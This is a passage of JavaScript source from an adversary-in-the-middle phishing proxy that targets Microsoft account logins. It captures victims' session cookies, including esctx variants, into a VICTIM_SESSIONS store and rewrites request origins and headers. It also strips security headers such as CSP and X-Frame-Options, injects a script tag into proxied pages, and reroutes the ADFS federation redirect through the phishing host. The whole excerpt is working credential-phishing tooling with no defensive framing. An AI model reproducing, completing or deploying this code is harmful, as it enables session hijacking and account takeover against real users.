    let cookieDomain = request.hostname;
    let cookiePath = (pathNameMatch ?? ["/"])[0];
    let cookieExpires = NaN;
    let cookieMaxAge = "";
    let cookieHostOnly = true;
    let isCookieValid = true;

    for (const attribute of attributes) {
      const cookieAttribute = attribute.trim();
      const cookieDomainMatch = cookieAttribute.match(/^domain\s*=(.*)$/i);
      const cookiePathMatch = cookieAttribute.match(/^path\s*=(.*)$/i);
      const cookieExpiresMatch = cookieAttribute.match(/^expires\s*=(.*)$/i);
      const cookieMaxAgeMatch = cookieAttribute.match(/^max-age\s*=(.*)$/i);

      if (cookieAttribute.toLowerCase() === "domain") {
        cookieDomain = request.hostname;
        cookieHostOnly = true;
        isCookieValid = true;
      } else if (cookieAttribute.toLowerCase() === "path") {
        cookiePath = (pathNameMatch ?? ["/"])[0];
      } else if (cookieAttribute.toLowerCase() === "expires") {
        cookieExpires = NaN;
      } else if (cookieAttribute.toLowerCase() === "max-age") {
        cookieMaxAge = "";
      } else if (cookieDomainMatch) {
        cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
        cookieHostOnly = true;
        isCookieValid = true;

        if (!cookieDomain) {
          cookieDomain = request.hostname;
        } else if (
          cookieDomain === "login.live.com" ||
          cookieDomain.endsWith(".live.com")
        ) {
          cookieHostOnly = false;
          isCookieValid = true;
        } else if (cookieDomain !== request.hostname) {
          if (isDomainApplicable(request.hostname, cookieDomain, false)) {
            cookieHostOnly = false;
          } else {
            const requestParts = request.hostname.split(".");
            const domainParts = cookieDomain.split(".");

            if (requestParts.length >= domainParts.length) {
              const requestSuffix = requestParts
                .slice(-domainParts.length)
                .join(".");
              if (requestSuffix === cookieDomain) {
                cookieHostOnly = false;
                isCookieValid = true;
              } else {
                const parentDomain = requestParts
                  .slice(-Math.min(domainParts.length, 2))
                  .join(".");
                if (parentDomain) {
                  cookieDomain = parentDomain;
                  cookieHostOnly = false;
                  isCookieValid = true;
                } else {
                  isCookieValid = false;
                  continue;
                }
              }
            } else {
              isCookieValid = false;
              continue;
            }
          }
        }
      } else if (cookiePathMatch) {
        cookiePath = cookiePathMatch[1].trim();
        if (!cookiePath.startsWith("/")) {
          cookiePath = (pathNameMatch ?? ["/"])[0];
        }
      } else if (cookieExpiresMatch) {
        cookieExpires = cookieExpiresMatch[1].trim();
        cookieExpires = parseCookieDate(cookieExpires);
      } else if (cookieMaxAgeMatch) {
        cookieMaxAge = cookieMaxAgeMatch[1].trim();
        if (!/^-?\d+$/.test(cookieMaxAge)) {
          cookieMaxAge = "";
        }
      }
    }

    if (!isCookieValid) {
      continue;
    }

    cookieExpires += clockSkew;
    if (cookieMaxAge) {
      const seconds = parseInt(cookieMaxAge);
      if (!isNaN(seconds)) {
        cookieExpires = currentTimestamp + seconds * 1000;
      }
    }

    // 🔥 FIX: Track if this is an esctx variant
    const isEsctxVariant =
      cookieName.includes("-") && cookieName.split("-")[0] === "esctx";
    const baseCookieName = isEsctxVariant ? "esctx" : cookieName;

    let isNewCookie = true;
    let matchedCookieIndex = -1;

    // First pass: try to match by exact name
    for (let i = 0; i < VICTIM_SESSIONS[currentSession].cookies.length; i++) {
      const sessionCookie = VICTIM_SESSIONS[currentSession].cookies[i];

      if (sessionCookie.name === cookieName) {
        matchedCookieIndex = i;
        break;
      }
    }

    // Second pass: if not found and this is an esctx variant, try to update the main esctx
    if (matchedCookieIndex === -1 && isEsctxVariant) {
      for (let i = 0; i < VICTIM_SESSIONS[currentSession].cookies.length; i++) {
        const sessionCookie = VICTIM_SESSIONS[currentSession].cookies[i];
        if (
          sessionCookie.name === "esctx" &&
          sessionCookie.domain === cookieDomain
        ) {
          matchedCookieIndex = i;
          // Update the main esctx with the new value
          console.log(
            `[COOKIE SYNC] Updating main esctx with variant ${cookieName}`,
          );
          break;
        }
      }
    }

    if (matchedCookieIndex !== -1) {
      const sessionCookie =
        VICTIM_SESSIONS[currentSession].cookies[matchedCookieIndex];
      if (currentTimestamp > cookieExpires) {
        VICTIM_SESSIONS[currentSession].cookies.splice(matchedCookieIndex, 1);
        // Also remove any variants if main cookie expired
        if (sessionCookie.name === "esctx") {
          VICTIM_SESSIONS[currentSession].cookies = VICTIM_SESSIONS[
            currentSession
          ].cookies.filter((c) => !c.name.startsWith("esctx-"));
        }
      } else {
        sessionCookie.value = cookieValue.join("=");
        sessionCookie.expires = cookieExpires;
        isNewCookie = false;
        console.log(
          `[COOKIE UPDATED] ${cookieName}=${cookieValue.join("=").substring(0, 20)}... domain=${cookieDomain}`,
        );

        // 🔥 FIX: If this was an esctx variant, also store it separately
        // but keep the main esctx in sync
        if (isEsctxVariant) {
          // Check if the variant already exists
          let variantExists = false;
          for (const c of VICTIM_SESSIONS[currentSession].cookies) {
            if (c.name === cookieName) {
              variantExists = true;
              c.value = cookieValue.join("=");
              c.expires = cookieExpires;
              break;
            }
          }
          if (!variantExists) {
            VICTIM_SESSIONS[currentSession].cookies.push({
              name: cookieName,
              value: cookieValue.join("="),
              domain: cookieDomain,
              path: cookiePath,
              expires: cookieExpires,
              hostOnly: cookieHostOnly,
            });
            console.log(
              `[COOKIE STORED VARIANT] ${cookieName}=${cookieValue.join("=").substring(0, 20)}...`,
            );
          }
        }
      }
    }

    if (isNewCookie && !(currentTimestamp > cookieExpires)) {
      console.log(
        `[COOKIE STORED] ${cookieName}=${cookieValue.join("=").substring(0, 20)}... domain=${cookieDomain} path=${cookiePath}`,
      );

      VICTIM_SESSIONS[currentSession].cookies.push({
        name: cookieName,
        value: cookieValue.join("="),
        domain: cookieDomain,
        path: cookiePath,
        expires: cookieExpires,
        hostOnly: cookieHostOnly,
      });
    }
  }
}
function getValidDomains(domains) {
  const validDomains = [];

  for (const domain of domains) {
    const splitDomain = domain.split(".");
    for (let i = 2; i < splitDomain.length + 1; i++) {
      const validDomain = splitDomain.slice(-i).join(".");
      if (!validDomains.includes(validDomain)) {
        validDomains.push(validDomain);
      }
    }
  }
  return validDomains;
}

function updateProxyRequestHeaders(
  proxyRequestOptions,
  currentSession,
  proxyHostname,
) {
  const azureHTTPRequestHeaders = [
    "max-forwards",
    "x-arr-log-id",
    "client-ip",
    "disguised-host",
    "x-site-deployment-id",
    "was-default-hostname",
    "x-forwarded-proto",
    "x-appservice-proto",
    "x-arr-ssl",
    "x-forwarded-tlsversion",
    "x-forwarded-for",
    "x-original-url",
    "x-waws-unencoded-url",
    "x-client-ip",
    "x-client-port",
  ];

  const proxyRequestCookies = prepareProxyRequestCookies(
    proxyRequestOptions,
    currentSession,
    proxyHostname,
  );
  if (Object.keys(proxyRequestCookies).length) {
    proxyRequestOptions.headers.cookie = proxyRequestCookies;
  } else {
    delete proxyRequestOptions.headers.cookie;
  }

  if (proxyRequestOptions.headers.origin) {
    proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}`;
  }
  if (
    proxyRequestOptions.headers.hasOwnProperty("referer") &&
    (!proxyRequestOptions.headers.referer ||
      proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT))
  ) {
    delete proxyRequestOptions.headers.referer;
  }

  for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
    if (azureHTTPRequestHeaders.includes(key)) {
      delete proxyRequestOptions.headers[key];
    } else {
      proxyRequestOptions.headers[key] = value.replaceAll(
        proxyHostname,
        VICTIM_SESSIONS[currentSession].host,
      );
    }
  }
}

function deleteHTTPSecurityResponseHeaders(headers) {
  const httpSecurityResponseHeaders = [
    "x-frame-options",
    "x-xss-protection",
    "x-content-type-options",
    "set-cookie",
    "content-security-policy",
    "content-security-policy-report-only",
    "cross-origin-opener-policy",
    "cross-origin-embedder-policy",
    "cross-origin-resource-policy",
    "permissions-policy",
    "service-worker-allowed",
  ];

  for (const header of httpSecurityResponseHeaders) {
    delete headers[header];
  }
}

function decompressData(compressedData, encoding) {
  const decompressionAlgorithms = {
    gzip: zlib.gunzip,
    "x-gzip": zlib.gunzip,
    deflate: zlib.inflate,
    br: zlib.brotliDecompress,
    zstd: zlib.zstdDecompress,
  };

  return new Promise((resolve, reject) => {
    const decompressionAlgorithm = decompressionAlgorithms[encoding];

    if (decompressionAlgorithm) {
      decompressionAlgorithm(compressedData, (error, decompressedData) => {
        if (error) reject(error);
        else resolve(decompressedData);
      });
    } else {
      resolve(compressedData);
    }
  });
}

function compressData(decompressedData, encoding) {
  const compressionAlgorithms = {
    gzip: zlib.gzip,
    "x-gzip": zlib.gzip,
    deflate: zlib.deflate,
    br: zlib.brotliCompress,
    zstd: zlib.zstdCompress,
  };

  return new Promise((resolve, reject) => {
    const compressionAlgorithm = compressionAlgorithms[encoding];

    if (compressionAlgorithm) {
      compressionAlgorithm(decompressedData, (error, compressedData) => {
        if (error) reject(error);
        else resolve(compressedData);
      });
    } else {
      resolve(decompressedData);
    }
  });
}

async function decompressResponseBody(compressedData, contentEncoding) {
  if (!contentEncoding) {
    return {
      decompressedResponseBody: compressedData,
      encodings: [],
    };
  }

  const encodings = contentEncoding
    .split(",")
    .map((encoding) => encoding.trim().toLowerCase())
    .filter((encoding) => encoding);

  let decompressedData = compressedData;
  for (let i = encodings.length - 1; i >= 0; i--) {
    decompressedData = await decompressData(decompressedData, encodings[i]);
  }
  return {
    decompressedResponseBody: decompressedData,
    encodings: encodings,
  };
}

async function compressResponseBody(decompressedData, encodings) {
  let compressedData = decompressedData;

  for (const encoding of encodings) {
    compressedData = await compressData(compressedData, encoding);
  }
  return compressedData;
}

function updateHTMLProxyResponse(decompressedResponseBody) {
  const payload = "<script src=/@></script>";
  const htmlInjectionMap = {
    "<head>": `<head>${payload}`,
    "<html>": `<html><head>${payload}</head>`,
    "<body>": `<head>${payload}</head><body>`,
  };
  const indexLimit = 200;

  for (const [key, value] of Object.entries(htmlInjectionMap)) {
    const htmlTagBuffer = Buffer.from(key);
    const injectionPointIndex = decompressedResponseBody
      .subarray(0, indexLimit)
      .indexOf(htmlTagBuffer);

    if (injectionPointIndex !== -1) {
      return Buffer.concat([
        decompressedResponseBody.subarray(0, injectionPointIndex),
        Buffer.from(value),
        decompressedResponseBody.subarray(
          injectionPointIndex + htmlTagBuffer.byteLength,
        ),
      ]);
    }
  }
  return Buffer.concat([
    Buffer.from(`<head>${payload}</head>`),
    decompressedResponseBody,
  ]);
}

// Modify the FederationRedirectUrl variable to proxify the cross-origin navigation request to the ADFS portal
function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
  const decompressedResponseBodyString = decompressedResponseBody.toString();
  const decompressedResponseBodyObject = JSON.parse(
    decompressedResponseBodyString,
  );
  const federationRedirectUrl =
    decompressedResponseBodyObject.Credentials.FederationRedirectUrl;

  const proxyRequestURL = new URL(
    `https://${proxyHostname}${PROXY_PATHNAMES.mutation}`,
  );
  proxyRequestURL.searchParams.append(
    PHISHED_URL_PARAMETER,
    encodeURIComponent(federationRedirectUrl),
  );

  decompressedResponseBodyObject.Credentials.FederationRedirectUrl =
    proxyRequestURL;
  return Buffer.from(JSON.stringify(decompressedResponseBodyObject));
}
